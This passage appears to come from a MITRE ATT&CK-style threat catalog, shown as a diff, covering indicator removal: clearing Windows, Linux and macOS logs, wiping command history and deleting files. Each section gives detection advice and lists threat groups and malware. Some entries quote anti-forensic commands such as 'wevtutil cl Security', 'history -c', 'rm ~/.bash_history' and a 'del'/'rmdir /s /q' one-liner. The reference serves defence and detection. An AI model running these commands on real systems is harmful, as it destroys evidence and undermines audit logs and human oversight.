+- [S0645] Wevtutil: Wevtutil can be used to clear system and security event logs from the system.
+- [G0114] Chimera: Chimera has cleared event logs on compromised hosts.
+- [G0143] Aquatic Panda: Aquatic Panda clears Windows Event Logs following activity to evade defenses.
+- [G0007] APT28: APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.
+- [G0096] APT41: APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.
+- [S0532] Lucifer: Lucifer can clear and remove event logs.
+- [S0365] Olympic Destroyer: Olympic Destroyer will attempt to clear the System and Security event logs using wevtutil.
+- [G0119] Indrik Spider: Indrik Spider has used Cobalt Strike to empty log files. Additionally, Indrik Spider has cleared all event logs using `wevutil`.
+- [G0082] APT38: APT38 clears Window Event logs and Sysmon logs from the system.
+- [G0035] Dragonfly: Dragonfly has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.
+- [S0182] FinFisher: FinFisher clears the system event logs using OpenEventLog/ClearEventLog APIs .
+- [S1068] BlackCat: BlackCat can clear Windows event logs using `wevtutil.exe`.
+- [S0412] ZxShell: ZxShell has a command to clear system event logs.
+- [S0698] HermeticWizard: HermeticWizard has the ability to use `wevtutil cl system` to clear event logs.
+- [G0050] APT32: APT32 has cleared select event log entries.
+- [S1199] LockBit 2.0: LockBit 2.0 can delete log files through the use of wevtutil.
+- [S0607] KillDisk: KillDisk deletes Application, Security, Setup, and System Windows Event Logs.
+- [G0053] FIN5: FIN5 has cleared event logs from victims.
+- [G0125] HAFNIUM: HAFNIUM has cleared actor-performed actions from logs.
+- [S0032] gh0st RAT: gh0st RAT is able to wipe event logs.
+- [S0203] Hydraq: Hydraq creates a backdoor through which remote attackers can clear all system event logs.
+- [S1135] MultiLayer Wiper: MultiLayer Wiper removes Windows event logs during execution.
+- [S1159] DUSTTRAP: DUSTTRAP can delete infected system log information.
+- [S1133] Apostle: Apostle will attempt to delete all event logs on a victim machine following file wipe activity.
+- [S0192] Pupy: Pupy has a module to clear event logs with PowerShell.
+- [S0253] RunningRAT: RunningRAT contains code to clear event logs.
+- [S0089] BlackEnergy: The BlackEnergy component KillDisk is capable of deleting Windows Event Logs.
+- [C0014] Operation Wocao: During Operation Wocao, the threat actors deleted all Windows system and security event logs using `/Q /c wevtutil cl system` and `/Q /c wevtutil cl security`.
+- [S0697] HermeticWiper: HermeticWiper can overwrite the `C:\Windows\System32\winevt\Logs` file on a targeted system.
+- [G1040] Play: Play has used tools to remove log files on targeted systems.
+
+### T1070.002 - Indicator Removal: Clear Linux or Mac System Logs
+
+Description:
+
+Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as: * /var/log/messages:: General and system-related messages * /var/log/secure or /var/log/auth.log: Authentication logs * /var/log/utmp or /var/log/wtmp: Login records * /var/log/kern.log: Kernel logs * /var/log/cron.log: Crond logs * /var/log/maillog: Mail server logs * /var/log/httpd/: Web server access and error logs
+
+Detection:
+
+File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.
+
+Procedures:
+
+- [S1164] UPSTYLE: UPSTYLE clears error logs after reading embedded commands for execution.
+- [S1206] JumbledPath: JumbledPath can clear logs on all devices used along its connection path to compromised network infrastructure.
+- [G1041] Sea Turtle: Sea Turtle has overwritten Linux system logs and unsets the Bash history file (effectively removing logging) during intrusions.
+- [S1016] MacMa: MacMa can clear possible malware traces such as application logs.
+- [G0139] TeamTNT: TeamTNT has removed system logs from /var/log/syslog.
+- [G1045] Salt Typhoon: Salt Typhoon has cleared logs including .bash_history, auth.log, lastlog, wtmp, and btmp.
+- [G0106] Rocke: Rocke has cleared log files within the /var/log/ folder.
+- [S0279] Proton: Proton removes logs from /var/logs and /Library/logs.
+
+### T1070.003 - Indicator Removal: Clear Command History
+
+Description:
+
+In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history. Adversaries may also leverage a Network Device CLI on network devices to clear command history data (clear logging and/or clear history). On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file. On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends. The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends. Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.
+
+Detection:
+
+User authentication, especially via remote terminal services like SSH, without new entries in that user's ~/.bash_history is suspicious. Additionally, the removal/clearing of the ~/.bash_history file can be an indicator of suspicious activity. Monitor for suspicious modifications or deletion of ConsoleHost_history.txt and use of the Clear-History command.
+
+Procedures:
+
+- [G0143] Aquatic Panda: Aquatic Panda cleared command history in Linux environments to remove traces of activity after operations.
+- [S1203] J-magic: J-magic can overwrite previously executed command line arguments.
+- [G0139] TeamTNT: TeamTNT has cleared command history with history -c.
+- [S0641] Kobalos: Kobalos can remove all command history on compromised hosts.
+- [S0601] Hildegard: Hildegard has used history -c to clear script shell logs.
+- [G0045] menuPass: menuPass has used Wevtutil to remove PowerShell execution logs.
+- [G0059] Magic Hound: Magic Hound has removed mailbox export requests from compromised Exchange servers.
+- [G0032] Lazarus Group: Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility.
+- [G1023] APT5: APT5 has cleared the command history on targeted ESXi servers.
+- [G0096] APT41: APT41 attempted to remove evidence of some of its activity by deleting Bash histories.
+
+### T1070.004 - Indicator Removal: File Deletion
+
+Description:
+
+Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows, rm or unlink on Linux and macOS, and `rm` on ESXi.
+
+Detection:
+
+It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.
+
+Procedures:
+
+- [S0164] TDTESS: TDTESS creates then deletes log files during installation of itself as a service.
+- [S0395] LightNeuron: LightNeuron has a function to delete files.
+- [S1150] ROADSWEEP: ROADSWEEP can use embedded scripts to remove itself from the infected host.
+- [S0654] ProLock: ProLock can remove files containing its payload after they are executed.
+- [G0143] Aquatic Panda: Aquatic Panda has deleted malicious executables from compromised machines.
+- [S1212] RansomHub: RansomHub has the ability to self-delete.
+- [S0354] Denis: Denis has a command to delete files from the victim’s machine.
+- [S0448] Rising Sun: Rising Sun can delete files and artifacts it creates.
+- [G0051] FIN10: FIN10 has used batch scripts and scheduled tasks to delete critical system files.
+- [S0593] ECCENTRICBANDWAGON: ECCENTRICBANDWAGON can delete log files generated from the malware stored at C:\windows\temp\tmp0207.
+- [S0370] SamSam: SamSam has been seen deleting its own files and payloads to make analysis of the attack more difficult.
+- [S0390] SQLRat: SQLRat has used been observed deleting scripts once used.
+- [G0045] menuPass: A menuPass macro deletes files after it has decoded and decompressed them.
+- [S1027] Heyoka Backdoor: Heyoka Backdoor has the ability to delete folders and files from a targeted system.
+- [G0060] BRONZE BUTLER: The BRONZE BUTLER uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.
+- [S0282] MacSpy: MacSpy deletes any temporary files it creates
+- [G0081] Tropic Trooper: Tropic Trooper has deleted dropper files on an infected system using command scripts.
+- [S0584] AppleJeus: AppleJeus has deleted the MSI file after installation.
+- [S0437] Kivars: Kivars has the ability to uninstall malware from the infected host.
+- [G0139] TeamTNT: TeamTNT has used a payload that removes itself after running. TeamTNT also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.
+- [S1105] COATHANGER: COATHANGER removes files from victim environments following use in multiple instances.
+- [S0527] CSPY Downloader: CSPY Downloader has the ability to self delete.
+- [S0344] Azorult: Azorult can delete files from victim machines.
+- [S0673] DarkWatchman: DarkWatchman has been observed deleting its original launcher after installation.
+- [S1182] MagicRAT: MagicRAT can delete files on victim systems, including itself.
+- [S0268] Bisonal: Bisonal will delete its dropper and VBS scripts from the victim’s machine.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer.
+- [G0082] APT38: APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.
+- [S0629] RainyDay: RainyDay has the ability to uninstall itself by deleting its service and files.
+- [S0107] Cherry Picker: Recent versions of Cherry Picker delete files and registry keys created by the malware.
+- [S0239] Bankshot: Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.
+- [G0053] FIN5: FIN5 uses SDelete to clean up the environment and attempt to prevent detection.
+- [S0342] GreyEnergy: GreyEnergy can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.
+- [S0380] StoneDrill: StoneDrill has been observed deleting the temporary files once they fulfill their task.
+- [S0093] Backdoor.Oldrea: Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim.
+- [S0443] MESSAGETAP: Once loaded into memory, MESSAGETAP deletes the keyword_parm.txt and parm.txt configuration files from disk.
+- [S0260] InvisiMole: InvisiMole has deleted files and directories including XML and files successfully uploaded to C2 servers.
+- [S0279] Proton: Proton removes all files in the /tmp directory.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D has a command to delete a file from the system. OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution.
+- [S0372] LockerGoga: LockerGoga has been observed deleting its original launcher after execution.
+- [S0409] Machete: Once a file is uploaded, Machete will delete it from the machine.
+- [S0233] MURKYTOP: MURKYTOP has the capability to delete local files.
+- [S0502] Drovorub: Drovorub can delete specific files from a compromised host.
+- [S0666] Gelsemium: Gelsemium can delete its dropper component from the targeted system.
+- [S0347] AuditCred: AuditCred can delete files from the system.
+- [S0249] Gold Dragon: Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence.
+- [S0125] Remsec: Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.
+- [S1200] StealBit: StealBit can self-delete its executable file from the compromised system.
+- [S0176] Wingbird: Wingbird deletes its payload along with the payload's parent process after it finishes copying files.
+- [S0434] Imminent Monitor: Imminent Monitor has deleted files related to its dynamic debugger feature.
+- [S0256] Mosquito: Mosquito deletes files using DeleteFileW API call.
+- [S0257] VERMIN: VERMIN can delete files on the victim’s machine.
+- [S0556] Pay2Key: Pay2Key can remove its log file from disk.
+- [G1040] Play: Play has used tools including Wevtutil to remove malicious files from compromised hosts.
+- [S0201] JPIN: JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.
+- [G1043] BlackByte: BlackByte deleted ransomware executables post-encryption.
+- [C0029] Cutting Edge: During Cutting Edge, threat actors deleted `/tmp/test1.txt` on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.
+- [S0062] DustySky: DustySky can delete files it creates from the infected system.
+- [S0601] Hildegard: Hildegard has deleted scripts after execution.
+- [S0091] Epic: Epic has a command to delete a file from the machine.
+- [S0195] SDelete: SDelete deletes data in a way that makes it unrecoverable.
+- [S1111] DarkGate: DarkGate has deleted its staging directories.
+- [S0265] Kazuar: Kazuar can delete files.
+- [S0441] PowerShower: PowerShower has the ability to remove all files created during the dropper process.
+- [S0011] Taidoor: Taidoor can use DeleteFileA to remove files from infected hosts.
+- [S0562] SUNSPOT: Following the successful injection of SUNBURST, SUNSPOT deleted a temporary file it created named InventoryManager.bk after restoring the original SolarWinds Orion source code to the software library.
+- [S0162] Komplex: The Komplex trojan supports file deletion.
+- [S0181] FALLCHILL: FALLCHILL can delete malware and associated artifacts from the victim.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.
+- [S0172] Reaver: Reaver deletes the original dropped file from the victim.
+- [S0238] Proxysvc: Proxysvc can delete files indicated by the attacker and remove itself from disk using a batch file.
+- [S0264] OopsIE: OopsIE has the capability to delete files and scripts from the victim's machine.
+- [G1003] Ember Bear: Ember Bear deletes files related to lateral movement to avoid detection.
+- [S0603] Stuxnet: Stuxnet uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.
+- [S0283] jRAT: jRAT has a function to delete files from the victim’s machine.
+- [S0356] KONNI: KONNI can delete files.
+- [S0567] Dtrack: Dtrack can remove its persistence and delete itself.
+- [S0015] Ixeshe: Ixeshe has a command to delete a file from the machine.
+- [S1014] DanBot: DanBot can delete its configuration file after installation.
+- [S0431] HotCroissant: HotCroissant has the ability to clean up installed files, delete files, and delete itself from the victim’s machine.
+- [C0040] APT41 DUST: APT41 DUST deleted various artifacts from victim systems following use.
+- [S0115] Crimson: Crimson has the ability to delete files from a compromised host.
+- [S0350] zwShell: zwShell has deleted itself after creating a service as well as deleted a temporary file when the system reboots.
+- [S0385] njRAT: njRAT is capable of deleting files.
+- [G0094] Kimsuky: Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.
+- [C0028] 2015 Ukraine Electric Power Attack: During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after `FONTCACHE.DAT`, `rundll32.exe`, and the associated .lnk file is delivered.
+- [S1022] IceApple: IceApple can delete files and directories from targeted systems.
+- [S0615] SombRAT: SombRAT has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host.
+- [G0049] OilRig: OilRig has deleted files associated with their payload after execution.
+- [S0240] ROKRAT: ROKRAT can request to delete files.
+- [S0045] ADVSTORESHELL: ADVSTORESHELL can delete files and directories.
+- [S0625] Cuba: Cuba can use the command cmd.exe /c del to delete its artifacts from the system.
+- [S0259] InnaputRAT: InnaputRAT has a command to delete files.
+- [G0037] FIN6: FIN6 has removed files from victim machines.
+- [G0096] APT41: APT41 deleted files from the system.
+- [S1202] LockBit 3.0: LockBit 3.0 can delete itself from disk.
+- [G0087] APT39: APT39 has used malware to delete files after they are deployed on a compromised host.
+- [S1160] Latrodectus: Latrodectus has the ability to delete itself.
+- [G0016] APT29: APT29 has used SDelete to remove artifacts from victim networks.
+- [G0102] Wizard Spider: Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use.
+- [S1207] XLoader: XLoader can delete malicious executables from compromised machines.
+- [G0007] APT28: APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.
+- [G0026] APT18: APT18 actors deleted tools and batch files from victim systems.
+- [S0456] Aria-body: Aria-body has the ability to delete files and directories on compromised hosts.
+- [S1043] ccf32: ccf32 can delete files and folders from compromised machines.
+- [S0211] Linfo: Linfo creates a backdoor through which remote attackers can delete files.
+- [S0657] BLUELIGHT: BLUELIGHT can uninstall itself.
+- [G0120] Evilnum: Evilnum has deleted files used during infection.
+- [S0094] Trojan.Karagany: Trojan.Karagany has used plugins with a self-delete capability.
+- [S0455] Metamorfo: Metamorfo has deleted itself from the system after execution.
+- [S0277] FruitFly: FruitFly will delete files on the system.
+- [S0087] Hi-Zor: Hi-Zor deletes its RAT installer file as it executes its DLL payload file.
+- [S0498] Cryptoistic: Cryptoistic has the ability delete files from a compromised host.
+- [S0228] NanHaiShu: NanHaiShu launches a script to delete their original decoy file to cover tracks.
+- [S0689] WhisperGate: WhisperGate can delete tools from a compromised host after execution.
+- [S0153] RedLeaves: RedLeaves can delete specified files.
+- [S0346] OceanSalt: OceanSalt can delete files from the system.
+- [S0053] SeaDuke: SeaDuke can securely delete files, including deleting itself from the victim.
+- [S1141] LunarWeb: LunarWeb can self-delete from a compromised host if safety checks of C2 connectivity fail.
+- [S0083] Misdat: Misdat is capable of deleting the backdoor file.
+- [S0520] BLINDINGCAN: BLINDINGCAN has deleted itself and associated artifacts from victim machines.
+- [G0035] Dragonfly: Dragonfly has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.
+- [S0444] ShimRat: ShimRat can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.
+- [S0475] BackConfig: BackConfig has the ability to remove files and folders related to previous infections.
+- [S0513] LiteDuke: LiteDuke can securely delete files by first writing random data to the file.
+- [S0149] MoonWind: MoonWind can delete itself or specified files.
+- [S1192] NICECURL: NICECURL has a function to remove artifacts.
+- [G0129] Mustang Panda: Mustang Panda will delete their tools and files, and kill processes after their objectives are reached.
+- [G0034] Sandworm Team: Sandworm Team has used backdoors that can delete files used in an attack from an infected system.
+- [S0284] More_eggs: More_eggs can remove itself from a system.
+- [S0139] PowerDuke: PowerDuke has a command to write random data across a file and delete it.
+- [S0067] pngdowner: pngdowner deletes content from C2 communications that was saved to the user's temporary directory.
+- [S0410] Fysbis: Fysbis has the ability to delete files.
+- [S0085] S-Type: S-Type has deleted files it has created on a compromised host.
+- [S1151] ZeroCleare: ZeroCleare has the ability to uninstall the RawDisk driver and delete the `rwdsk` file on disk.
+- [S0491] StrongPity: StrongPity can delete previously exfiltrated files from the compromised host.
+- [C0014] Operation Wocao: During Operation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\windows\temp\ & copy \\\c$\windows\system32\devmgr.dll \\\c$\windows\temp\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\windows\temp\ & del \\\c$\windows\temp\LMAKSW.ps1`.
+- [S0412] ZxShell: ZxShell can delete files from the system.
+- [G0059] Magic Hound: Magic Hound has deleted and overwrote files to cover tracks.
+- [G0050] APT32: APT32's macOS backdoor can receive a “delete” command.
+- [S0416] RDFSNIFFER: RDFSNIFFER has the capability of deleting local files.
+- [S0253] RunningRAT: RunningRAT contains code to delete files from the victim’s machine.
+- [S0442] VBShower: VBShower has attempted to complicate forensic analysis by deleting all the files contained in %APPDATA%\..\Local\Temporary Internet Files\Content.Word and %APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\.
+- [S0561] GuLoader: GuLoader can delete its executable from the AppData\Local\Temp directory on the compromised host.
+- [S0531] Grandoreiro: Grandoreiro can delete .LNK files created in the Startup folder.
+- [S0692] SILENTTRINITY: SILENTTRINITY can remove files from the compromised host.
+- [S0168] Gazer: Gazer has commands to delete files and persistence mechanisms from the victim.
+- [S0512] FatDuke: FatDuke can secure delete its DLL.
+- [S0374] SpeakUp: SpeakUp deletes files to remove evidence on the machine.
+- [G0080] Cobalt Group: Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks.
+- [S0630] Nebulae: Nebulae has the ability to delete files and directories.
+- [S1065] Woody RAT: Woody RAT has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.
+- [S0493] GoldenSpy: GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.
+- [S1020] Kevin: Kevin can delete files created on the victim's machine.
+- [S1154] VersaMem: VersaMem deleted files related to initial installation such as temporary files related to the PID of the main web process.
+- [S0674] CharmPower: CharmPower can delete created files from a compromised system.
+- [G0061] FIN8: FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines.
+- [S0127] BBSRAT: BBSRAT can delete files and directories.
+- [S1135] MultiLayer Wiper: MultiLayer Wiper uses a batch file, remover.bat to delete malware artifacts and the batch file itself during execution.
+- [G1023] APT5: APT5 has deleted scripts and web shells to evade detection.
+- [S0435] PLEAD: PLEAD has the ability to delete files on the compromised host.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.
+- [S0451] LoudMiner: LoudMiner deleted installation files after completion.
+- [S0414] BabyShark: BabyShark has cleaned up all files associated with the secondary payload execution.
+- [S0353] NOKKI: NOKKI can delete files to cover tracks.
+- [S1161] BPFDoor: After initial setup, BPFDoor's original execution process deletes the dropped binary and exits.
+- [G0032] Lazarus Group: Lazarus Group malware has deleted files in various ways, including "suicide scripts" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.
+- [S0690] Green Lambert: Green Lambert can delete the original executable after initial installation in addition to unused functions.
+- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.
+- [C0035] KV Botnet Activity: KV Botnet Activity removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device.
+- [S0386] Ursnif: Ursnif has deleted data staged in tmp files after exfiltration.
+- [G0022] APT3: APT3 has a tool that can delete files.
+- [S0203] Hydraq: Hydraq creates a backdoor through which remote attackers can delete files.
+- [S1164] UPSTYLE: UPSTYLE removes `bootstrap.min.css` after parsing command and control instructions, restoring the file to its original state.
+- [S0598] P.A.S. Webshell: P.A.S. Webshell can delete scripts from a subdirectory of /tmp after they are run.
+- [S0401] Exaramel for Linux: Exaramel for Linux can uninstall its persistence mechanism and delete its configuration file.
+- [G0089] The White Company: The White Company has the ability to delete its malware entirely from the target system.
+- [S1081] BADHATCH: BADHATCH has the ability to delete PowerShell scripts from a compromised machine.
+- [S0589] Sibot: Sibot will delete itself if a certain server response is received.
+- [S0069] BLACKCOFFEE: BLACKCOFFEE has the capability to delete files.
+- [S1166] Solar: Solar has the ability to delete staged files after they are uploaded to C2.
+- [S0348] Cardinal RAT: Cardinal RAT can uninstall itself, including deleting its executable.
+- [S0663] SysUpdate: SysUpdate can delete its configuration file from the targeted system.
+- [S0021] Derusbi: Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.
+- [S0662] RCSession: RCSession can remove files from a targeted system.
+- [G0114] Chimera: Chimera has performed file deletion to evade detection.
+- [S1142] LunarMail: LunarMail can delete the previously used staging directory and files on subsequent rounds of exfiltration and replace it with a new one.
+- [S0582] LookBack: LookBack removes itself after execution and can delete files on the system.
+- [G0040] Patchwork: Patchwork removed certain files and replaced them so they could not be retrieved.
+- [C0032] C0032: During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.
+- [G0043] Group5: Malware used by Group5 is capable of remotely deleting files from victims.
+- [S0274] Calisto: Calisto has the capability to use rm -rf to remove folders and files from the victim's machine.
+- [S1050] PcShare: PcShare has deleted its files and components from a compromised host.
+- [S0345] Seasalt: Seasalt has a command to delete a specified file.
+- [S0396] EvilBunny: EvilBunny has deleted the initial dropper after running through the environment checks.
+- [S0081] Elise: Elise is capable of launching a remote shell on the host to delete itself.
+- [S1019] Shark: Shark can delete files downloaded to the compromised host.
+- [S0032] gh0st RAT: gh0st RAT has the capability to to delete files.
+- [C0046] ArcaneDoor: ArcaneDoor included multiple instances of file deletion or removal during execution and other adversary actions.
+- [S0070] HTTPBrowser: HTTPBrowser deletes its original installer file once installation is complete.
+- [S0141] Winnti for Windows: Winnti for Windows can delete the DLLs for its various components from a compromised host.
+- [S0495] RDAT: RDAT can issue SOAP requests to delete already processed C2 emails. RDAT can also delete itself from the infected system.
+- [S0155] WINDSHIELD: WINDSHIELD is capable of file deletion along with other file system interaction.
+- [S0382] ServHelper: ServHelper has a module to delete itself from the infected machine.
+- [S1148] Raccoon Stealer: Raccoon Stealer can remove files related to use and installation.
+- [S0269] QUADAGENT: QUADAGENT has a command to delete its Registry key and scheduled task.
+- [S0330] Zeus Panda: Zeus Panda has a command to delete a file. It also can uninstall scripts and delete files to cover its track.
+- [G1013] Metador: Metador has quickly deleted `cbd.exe` from a compromised host following the successful deployment of their malware.
+- [S1184] BOLDMOVE: BOLDMOVE can remove files on victim systems.
+- [S1047] Mori: Mori can delete its DLL file and related files by Registry value.
+- [G0047] Gamaredon Group: Gamaredon Group tools can delete files used during an operation.
+- [S0113] Prikormka: After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host.
+- [S1199] LockBit 2.0: LockBit 2.0 can delete itself from disk after execution.
+- [S0559] SUNBURST: SUNBURST had a command to delete files.
+- [S0439] Okrum: Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers.
+- [S0534] Bazar: Bazar can delete its loader using a batch file in the Windows temporary folder.
+- [S1170] ODAgent: ODAgent can delete payloads and files used to pass C2 commands from remotely hosted cloud accounts.
+- [S0223] POWERSTATS: POWERSTATS can delete all files on the C:\, D:\, E:\ and, F:\ drives using PowerShell Remove-Item commands.
+- [S1059] metaMain: metaMain has deleted collected items after uploading the content to its C2 server.
+- [G1017] Volt Typhoon: Volt Typhoon has run `rd /S` to delete their working directories and deleted systeminfo.dat from `C:\Users\Public\Documentsfiles`.
+- [S0251] Zebrocy: Zebrocy has a command to delete files and directories.
+- [S1130] Raspberry Robin: Raspberry Robin can delete its initial delivery script from disk during execution.
+- [S1181] BlackByte 2.0 Ransomware: BlackByte 2.0 Ransomware deletes itself following device encryption.
+- [S1017] OutSteel: OutSteel can delete itself following the successful execution of a follow-on payload.
+- [S0208] Pasam: Pasam creates a backdoor through which remote attackers can delete files.
+- [S0607] KillDisk: KillDisk has the ability to quit and delete itself.
+- [S0147] Pteranodon: Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.
+- [S0196] PUNCHBUGGY: PUNCHBUGGY can delete files written to disk.
+- [S1179] Exbyte: Exbyte will self-delete if a hard-coded configuration file is not found.
+- [G1032] INC Ransom: INC Ransom has uninstalled tools from compromised endpoints after use.
+- [S0679] Ferocious: Ferocious can delete files from a compromised host.
+- [G0091] Silence: Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.
+- [S0234] Bandook: Bandook has a command to delete a file.
+- [S0622] AppleSeed: AppleSeed can delete files from a compromised host after they are exfiltrated.
+- [S0151] HALFBAKED: HALFBAKED can delete a specified file.
+- [S0697] HermeticWiper: HermeticWiper has the ability to overwrite its own file with random bites.
+- [S0030] Carbanak: Carbanak has a command to delete files.
+- [S0517] Pillowmint: Pillowmint has deleted the filepath %APPDATA%\Intel\devmonsrv.exe.
+- [S0466] WindTail: WindTail has the ability to receive and execute a self-delete command.
+- [S1147] Nightdoor: Nightdoor can self-delete.
+- [S0586] TAINTEDSCRIBE: TAINTEDSCRIBE can delete files from a compromised host.
+- [S0438] Attor: Attor’s plugin deletes the collected files and log files after exfiltration.
+- [S0504] Anchor: Anchor can self delete its dropper after the malware is successfully deployed.
+- [S0447] Lokibot: Lokibot will delete its dropped files after bypassing UAC.
+- [G1039] RedCurl: RedCurl has deleted files after execution.
+- [S0106] cmd: cmd can be used to delete files from the file system.
+- [S1196] Troll Stealer: Troll Stealer creates and can execute a BAT script that will delete the malware.
+- [S1188] Line Runner: Line Runner removes its initial ZIP delivery archive after processing the enclosed LUA script.
+- [S0398] HyperBro: HyperBro has the ability to delete a specified file.
+- [S1015] Milan: Milan can delete files via `C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.
+- [G0106] Rocke: Rocke has deleted files on infected machines.
+- [S0271] KEYMARBLE: KEYMARBLE has the capability to delete files off the victim’s machine.
+- [S0632] GrimAgent: GrimAgent can delete old binaries on a compromised host.
+- [S1178] ShrinkLocker: ShrinkLocker can delete itself depending on various checks performed during execution.
+- [S0074] Sakula: Some Sakula samples use cmd.exe to delete temporary files.
+- [S1032] PyDCrypt: PyDCrypt will remove all created artifacts such as dropped executables.
+- [S0136] USBStealer: USBStealer has several commands to delete files associated with the malware from the victim.
+- [S1132] IPsec Helper: IPsec Helper can delete itself when given the appropriate command.
+- [S0496] REvil: REvil can mark its binary code for deletion after reboot.
+- [S0391] HAWKBALL: HAWKBALL has the ability to delete files.
+- [G0027] Threat Group-3390: Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.
+- [S1167] AcidPour: AcidPour includes a self-delete function where the malware deletes itself from disk after execution and program load into memory.
+- [S0462] CARROTBAT: CARROTBAT has the ability to delete downloaded files from a compromised host.
+- [S0044] JHUHUGIT: The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files.
+- [S0688] Meteor: Meteor will delete the folder containing malicious scripts if it detects the hostname as `PIS-APP`, `PIS-MOB`, `WSUSPROXY`, or `PIS-DB`.
+- [S0428] PoetRAT: PoetRAT has the ability to overwrite scripts and delete itself if a sandbox environment is detected.
+- [S0022] Uroburos: Uroburos can run a `Clear Agents Track` command on an infected machine to delete Uroburos-related logs.
+- [S1039] Bumblebee: Bumblebee can uninstall its loader through the use of a `Sdl` command.
+- [S0453] Pony: Pony has used scripts to delete itself after execution.
+- [S0381] FlawedAmmyy: FlawedAmmyy can execute batch scripts to delete files.
+- [S1198] Gomir: Gomir deletes its original executable and terminates its original process after creating a systemd service.
